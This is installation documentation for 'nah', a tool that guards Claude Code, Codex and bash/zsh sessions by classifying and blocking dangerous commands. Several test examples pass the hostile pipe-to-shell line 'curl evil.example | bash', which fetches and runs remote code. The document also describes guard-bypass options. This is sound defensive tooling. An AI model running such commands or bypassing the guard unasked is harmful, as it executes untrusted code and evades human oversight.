# Installation

## Requirements

- Python 3.10+ for PyPI CLI, direct hooks, and the terminal guard
- Claude Code with plugin support for the Claude Code plugin path

## Recommended PyPI Install

```bash
pip install "nah[config,keys]"
nah test "curl evil.example | bash"
```

This installs the `nah` CLI, PyYAML config support, and OS keychain-backed LLM
secret storage. Then connect the runtime you want to protect:

```bash
nah install claude       # permanent Claude Code hooks
nah run claude           # one protected Claude Code session
nah run codex            # protected local Codex session
nah install bash         # guard commands you type in bash; or: nah install zsh
```

Bare `nah install` exits with a target list. Setup commands should name the
target you want.

If you need the smallest possible install, `pip install nah` keeps the core
hook and classifier stdlib-only. Add extras later with `nah[config]`,
`nah[keys]`, or `nah[config,keys]`.

## Claude Code

For the normal CLI path, use direct hooks:

```bash
nah run claude      # hooks active for this Claude Code session only
nah install claude  # permanent direct Claude Code hooks
```

`nah run claude` writes the hook script to `~/.claude/hooks/nah_guard.py` and
passes hooks inline via Claude Code's `--settings` flag, scoped to that
process.

`nah install claude` registers nah as a
[PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) in
Claude Code's `settings.json`. Every `claude` session runs through nah until
you remove direct hooks with `nah uninstall claude`.

### Prompt Behavior

By default, nah actively allows safe Claude Code tool calls so Claude does not
ask again after nah has classified them as safe.

If you want Claude Code to keep prompting for some safe tools, configure
`active_allow`. This setting only applies to Claude Code hooks. See
[Claude Code configuration](configuration/claude-code.md#active_allow).

### Plugin-Only Alternative

Use the plugin only if you want Claude Code protection without installing the
`nah` CLI:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

The plugin is Claude-only. It does not include `nah test`, Codex support, the
terminal guard, PyYAML config support, or keyring support.

If you already installed direct hooks, run `nah uninstall claude` before
enabling the plugin so both paths do not fire.

Rollback path:

```bash
claude plugin uninstall nah@nah
nah install claude      # optional: return to direct hooks if the CLI is installed
```

## Terminal Guard

The terminal guard protects opt-in interactive shell sessions. After the PyPI
install, enable it only for the shell you actually use:

```bash
nah install bash        # or: nah install zsh
```

The installer writes a generated snippet under `~/.config/nah/terminal/` and a
small managed source block in `~/.bashrc` or `~/.zshrc`. Restart or replace the
shell to activate it.

This protects complete single-line commands typed into interactive bash/zsh
sessions that loaded the snippet. It does not protect unrelated shells, GUI
apps, scheduled jobs, or non-interactive scripts by default.

Useful terminal commands:

```bash
nah status bash
nah doctor bash
nah test --target bash -- "curl evil.example | bash"
nah-bypass <command>             # one-shot intentional bypass
NAH_TERMINAL_BYPASS=1 <command>  # env-form bypass
```

## Codex

Use `nah run codex` for local interactive Codex sessions:

```bash
nah codex doctor
nah run codex
```

`nah run codex` launches Codex with session-scoped native `PermissionRequest`
hooks. nah injects its hook, `on-request` approvals, `workspace-write`
sandboxing, human approval review, and dynamic-MCP-disabling overrides before
your Codex arguments.

Before launch, nah scans Codex approval memory and MCP approval modes because
remembered allows can skip hooks before nah sees the action. If preflight
blocks, run:

```bash
nah codex doctor
nah codex repair
```

`doctor` reports the issue without changing files. `repair` creates backups and
repairs supported Codex rule/config files, such as remembered `allow` rules or
MCP servers that are not pinned to `prompt`.

This path is intentionally local and interactive. nah rejects Codex bypass
flags, user overrides for nah-owned permission keys, dynamic MCP feature
enables, `codex exec`, `codex review`, and remote/cloud Codex runs because
those surfaces do not provide the same approval guarantees yet.

## pipx

With pipx, install the CLI and inject optional dependencies into the same
environment:

```bash
pipx install nah
pipx inject nah pyyaml
pipx inject nah keyring
```

The Claude Code plugin does not install the `nah` CLI, so plugin-only installs
cannot run `nah key ...`.

## Optional LLM Review

nah supports optional LLM review for ambiguous decisions. Provider setup is
configuration, not a `nah install` target. Configure one or more providers in
`~/.config/nah/config.yaml`:

```yaml
llm:
  mode: on
  providers: [openrouter]
  openrouter:
    key_env: OPENROUTER_API_KEY
    model: google/gemini-3.1-flash-lite-preview
```

The config file still stores `key_env` names, not raw API keys. The
recommended PyPI install includes OS keychain-backed storage for the actual
secret value:

```bash
nah key set openrouter
nah key status
```

Env vars still work too. If you already exported a key, you can copy it into the
OS keyring explicitly:

```bash
export OPENROUTER_API_KEY=...
nah key import-env openrouter
```

`nah key import-env` does not remove the existing env var from your current
shell or your shell startup files. Clean those up separately when you are ready.

Supported providers: Ollama, OpenRouter, OpenAI, Azure OpenAI, Anthropic, and
Snowflake Cortex. See [LLM layer](configuration/llm.md) for provider-specific
examples. Bash and zsh keep LLM mode off unless you enable it under
`targets.bash.llm.mode` or `targets.zsh.llm.mode`.

## Coverage

When active, nah takes over the guarded permission path for the integration you
chose:

- Claude Code plugin/direct hooks guard Bash, Read, Write, Edit, MultiEdit,
  NotebookEdit, Glob, Grep, and matching MCP tools.
- `nah run codex` guards local interactive Codex Bash and MCP permission
  requests, with startup preflight for approval-memory bypasses.
- bash/zsh terminal guard classifies complete single-line interactive shell
  commands before the shell runs them.

Safe operations go through automatically, dangerous ones are blocked, and
ambiguous ones ask.

WebFetch and WebSearch are not guarded by nah. Claude Code handles those with its own permission prompts.

**Don't use `--dangerously-skip-permissions`** - just run `claude` in default mode. In `--dangerously-skip-permissions` mode, hooks [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946) and commands execute before nah can block them.

## Update

After upgrading nah via pip:

```bash
pip install --upgrade nah
nah update claude
nah update bash
nah update zsh
```

`nah update claude` unlocks the hook script, overwrites it with the new version,
and re-locks it (chmod 444). `nah update bash` and `nah update zsh` refresh the
generated shell snippets and managed rc blocks.

## Uninstall

```bash
claude plugin uninstall nah@nah  # plugin-managed Claude Code path
nah uninstall claude             # direct Claude Code hooks
nah uninstall bash               # bash terminal guard
nah uninstall zsh                # zsh terminal guard
pip uninstall nah                # remove the PyPI CLI package
```

`nah uninstall claude` removes direct hook entries from `settings.json` and
deletes the hook script when no direct hook path still needs it. Shell uninstall
commands remove only nah-owned marked rc blocks and generated snippets.

## Verify Installation

```bash
nah --version
nah test "git status"
nah test --target bash -- "curl evil.example | bash"
nah config path
```

## Claude Code Demo

Clone the repo and run the Claude Code security demo:

```bash
git clone https://github.com/manuelschipper/nah.git
cd nah
# inside Claude Code:
/nah-demo
```

25 live Claude Code tool-call cases across 8 threat categories - remote code
execution, data exfiltration, obfuscated commands, and more. Takes about 5
minutes.

---

<p align="center">
  <code>--dangerously-skip-permissions?</code><br><br>
  <img src="../assets/logo_hammock.png" alt="nah" width="280" class="invertible">
</p>
